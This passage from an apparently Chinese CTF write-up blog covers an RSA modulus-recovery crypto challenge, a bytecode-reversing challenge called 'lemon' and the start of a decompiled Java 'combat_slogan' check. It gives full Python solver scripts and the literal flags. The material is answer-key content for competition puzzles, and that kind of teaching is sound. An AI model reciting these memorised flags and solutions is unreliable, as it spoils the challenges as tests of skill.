class="line">m = -gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m+(<span class="number">1</span>&lt;&lt;<span class="number">500</span>))[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>数学最重要的就是推导</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pinvq:<span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">qinvp:<span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">c:<span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">e:<span class="number">0x10005</span></span><br><span class="line">d:<span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br></pre></td></tr></table></figure></blockquote><p>给出 $x=\text{inv}(p,q),y=\text{inv}(q,p),e,d,c$。</p><p>详细推导思路可参考 <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span></span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span></span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">0x10005</span></span><br><span class="line">    <span class="comment">#fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = <span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br><span class="line">    pprime = <span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">    qprime = <span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h3><blockquote><p>re签到题，格式：flag{output}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">0: const 60 ; &lt;module &#x27;main&#x27;&gt; </span><br><span class="line">5: module 9 592</span><br><span class="line">11: const 26 ; 83 </span><br><span class="line">16: const 27 ; 69 </span><br><span class="line">21: const 28 ; 65 </span><br><span class="line">26: array 3</span><br><span class="line">31: store 0 0</span><br><span class="line">34: const 30 ; 101 </span><br><span class="line">39: const 31 ; 108 </span><br><span class="line">44: const 32 ; 111 </span><br><span class="line">49: const 33 ; 117 </span><br><span class="line">54: const 34 ; 122 </span><br><span class="line">59: const 30 ; 101 </span><br><span class="line">64: const 35 ; 105 </span><br><span class="line">69: const 36 ; 98 </span><br><span class="line">74: const 30 ; 101 </span><br><span class="line">79: const 31 ; 108 </span><br><span class="line">84: const 33 ; 117 </span><br><span class="line">89: const 35 ; 105 </span><br><span class="line">94: const 37 ; 113 </span><br><span class="line">99: const 33 ; 117 </span><br><span class="line">104: const 35 ; 105 </span><br><span class="line">109: const 37 ; 113 </span><br><span class="line">114: array 16</span><br><span class="line">119: store 0 1</span><br><span class="line">122: const 39 ; 0 </span><br><span class="line">127: store 0 2</span><br><span class="line">130: array 0</span><br><span class="line">135: store 0 3</span><br><span class="line">138: load 0 2</span><br><span class="line">141: const 42 ; 256 </span><br><span class="line">146: lt</span><br><span class="line">147: jz 184</span><br><span class="line">152: load 0 3</span><br><span class="line">155: const 43 ; append </span><br><span class="line">160: getattr</span><br><span class="line">161: load 0 2</span><br><span class="line">164: call 1</span><br><span class="line">166: pop</span><br><span class="line">167: load 0 2</span><br><span class="line">170: const 44 ; 1 </span><br><span class="line">175: add</span><br><span class="line">176: store 0 2</span><br><span class="line">179: jmp 138</span><br><span class="line">184: const 39 ; 0 </span><br><span class="line">189: store 0 4</span><br><span class="line">192: load 0 4</span><br><span class="line">195: const 42 ; 256 </span><br><span class="line">200: lt</span><br><span class="line">201: jz 271</span><br><span class="line">206: load 0 3</span><br><span class="line">209: load 0 4</span><br><span class="line">212: getitem</span><br><span class="line">213: load 0 0</span><br><span class="line">216: load 0 4</span><br><span class="line">219: const 46 ; 3 </span><br><span class="line">224: mod</span><br><span class="line">225: getitem</span><br><span class="line">226: add</span><br><span class="line">227: load 0 1</span><br><span class="line">230: load 0 4</span><br><span class="line">233: const 47 ; 16 </span><br><span class="line">238: mod</span><br><span class="line">239: getitem</span><br><span class="line">240: add</span><br><span class="line">241: const 42 ; 256 </span><br><span class="line">246: mod</span><br><span class="line">247: load 0 3</span><br><span class="line">250: load 0 4</span><br><span class="line">253: setitem</span><br><span class="line">254: load 0 4</span><br><span class="line">257: const 44 ; 1 </span><br><span class="line">262: add</span><br><span class="line">263: store 0 4</span><br><span class="line">266: jmp 192</span><br><span class="line">271: const 39 ; 0 </span><br><span class="line">276: store 0 5</span><br><span class="line">279: load 0 5</span><br><span class="line">282: const 46 ; 3 </span><br><span class="line">287: lt</span><br><span class="line">288: jz 448</span><br><span class="line">293: const 39 ; 0 </span><br><span class="line">298: store 0 6</span><br><span class="line">301: load 0 6</span><br><span class="line">304: const 42 ; 256 </span><br><span class="line">309: lt</span><br><span class="line">310: jz 366</span><br><span class="line">315: load 0 3</span><br><span class="line">318: load 0 6</span><br><span class="line">321: getitem</span><br><span class="line">322: load 0 3</span><br><span class="line">325: load 0 6</span><br><span class="line">328: const 44 ; 1 </span><br><span class="line">333: add</span><br><span class="line">334: const 42 ; 256 </span><br><span class="line">339: mod</span><br><span class="line">340: getitem</span><br><span class="line">341: bxor</span><br><span class="line">342: load 0 3</span><br><span class="line">345: load 0 6</span><br><span class="line">348: setitem</span><br><span class="line">349: load 0 6</span><br><span class="line">352: const 44 ; 1 </span><br><span class="line">357: add</span><br><span class="line">358: store 0 6</span><br><span class="line">361: jmp 301</span><br><span class="line">366: const 39 ; 0 </span><br><span class="line">371: store 0 7</span><br><span class="line">374: load 0 7</span><br><span class="line">377: const 42 ; 256 </span><br><span class="line">382: lt</span><br><span class="line">383: jz 431</span><br><span class="line">388: load 0 3</span><br><span class="line">391: load 0 7</span><br><span class="line">394: getitem</span><br><span class="line">395: const 44 ; 1 </span><br><span class="line">400: add</span><br><span class="line">401: const 42 ; 256 </span><br><span class="line">406: mod</span><br><span class="line">407: load 0 3</span><br><span class="line">410: load 0 7</span><br><span class="line">413: setitem</span><br><span class="line">414: load 0 7</span><br><span class="line">417: const 44 ; 1 </span><br><span class="line">422: add</span><br><span class="line">423: store 0 7</span><br><span class="line">426: jmp 374</span><br><span class="line">431: load 0 5</span><br><span class="line">434: const 44 ; 1 </span><br><span class="line">439: add</span><br><span class="line">440: store 0 5</span><br><span class="line">443: jmp 279</span><br><span class="line">448: const 39 ; 0 </span><br><span class="line">453: store 0 5</span><br><span class="line">456: const 39 ; 0 </span><br><span class="line">461: store 0 8</span><br><span class="line">464: load 0 5</span><br><span class="line">467: const 42 ; 256 </span><br><span class="line">472: lt</span><br><span class="line">473: jz 509</span><br><span class="line">478: load 0 8</span><br><span class="line">481: load 0 3</span><br><span class="line">484: load 0 5</span><br><span class="line">487: getitem</span><br><span class="line">488: add</span><br><span class="line">489: store 0 8</span><br><span class="line">492: load 0 5</span><br><span class="line">495: const 44 ; 1 </span><br><span class="line">500: add</span><br><span class="line">501: store 0 5</span><br><span class="line">504: jmp 464</span><br><span class="line">509: load 0 8</span><br><span class="line">512: const 51 ; 20 </span><br><span class="line">517: mul</span><br><span class="line">518: const 52 ; 5 </span><br><span class="line">523: add</span><br><span class="line">524: store 0 8</span><br><span class="line">527: load 0 8</span><br><span class="line">530: const 54 ; 30 </span><br><span class="line">535: mul</span><br><span class="line">536: const 52 ; 5 </span><br><span class="line">541: sub</span><br><span class="line">542: store 0 8</span><br><span class="line">545: load 0 8</span><br><span class="line">548: const 56 ; 40 </span><br><span class="line">553: mul</span><br><span class="line">554: const 52 ; 5 </span><br><span class="line">559: sub</span><br><span class="line">560: store 0 8</span><br><span class="line">563: load 0 8</span><br><span class="line">566: const 58 ; 50 </span><br><span class="line">571: mul</span><br><span class="line">572: const 59 ; 6645 </span><br><span class="line">577: add</span><br><span class="line">578: store 0 8</span><br><span class="line">581: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">586: load 0 8</span><br><span class="line">589: call 1</span><br><span class="line">591: pop</span><br></pre></td></tr></table></figure></blockquote><p>根据bytecode还原代码，需要注意数组的存储顺序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">83</span>,<span class="number">69</span>,<span class="number">65</span>][::-<span class="number">1</span>]</span><br><span class="line">c = [<span class="number">101</span>,<span class="number">108</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">122</span>,<span class="number">101</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>,<span class="number">117</span>,<span class="number">105</span>,<span class="number">113</span>][::-<span class="number">1</span>]</span><br><span class="line">S = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    S[j] = (S[j]+key[j%<span class="number">3</span>]+c[j%<span class="number">16</span>])%<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[x] = S[x]^S[(x+<span class="number">1</span>)%<span class="number">256</span>]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        S[y] = (S[y]+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    b = b+S[k]</span><br><span class="line"></span><br><span class="line">b = b*<span class="number">20</span>+<span class="number">5</span></span><br><span class="line">b = b*<span class="number">30</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">40</span>-<span class="number">5</span></span><br><span class="line">b = b*<span class="number">50</span>+<span class="number">6645</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 23075096395</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;23075096395&#125;</code></p><p>​    </p><h3 id="combat-slogan"><a href="#combat-slogan" class="headerlink" title="combat_slogan"></a>combat_slogan</h3><blockquote><p>面对疫情，我们的口号是什么？flag{input}</p></blockquote><p>用jd工具分析jar，在Main.class发现主代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xaut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">stringTransformAscii</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">    StringBuffer sbu = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">char</span>[] chars = value.toCharArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chars.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (i != chars.length - <span class="number">1</span>) &#123;</span><br><span class="line">        sbu.append(chars[i]).append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sbu.append(chars[i]);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sbu.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">ttk</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; input.length(); i++) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = input.charAt(i);</span><br><span class="line">      <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;m&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c + <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;n&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;N&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        c = (<span class="keyword">char</span>)(c - <span class="number">13</span>);</span><br><span class="line">      &#125; </span><br><span class="line">      sb.append(c);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input your keyword);</span></span><br><span class="line"><span class="string">    Scanner scan = new Scanner(System.in);</span></span><br><span class="line"><span class="string">    String str2 = &quot;</span>ddd<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if (scan.hasNextLine())</span></span><br><span class="line"><span class="string">      str2 = scan.nextLine(); </span></span><br><span class="line"><span class="string">    scan.close();</span></span><br><span class="line"><span class="string">    String stringTransformAscii = stringTransformAscii(str2);</span></span><br><span class="line"><span class="string">    String[] offerCodeString = stringTransformAscii.split(&quot;</span>,<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    StringBuffer str5 = new StringBuffer();</span></span><br><span class="line"><span class="string">    for (String s : offerCodeString)</span></span><br><span class="line"><span class="string">      str5.append(s); </span></span><br><span class="line"><span class="string">    int flag = 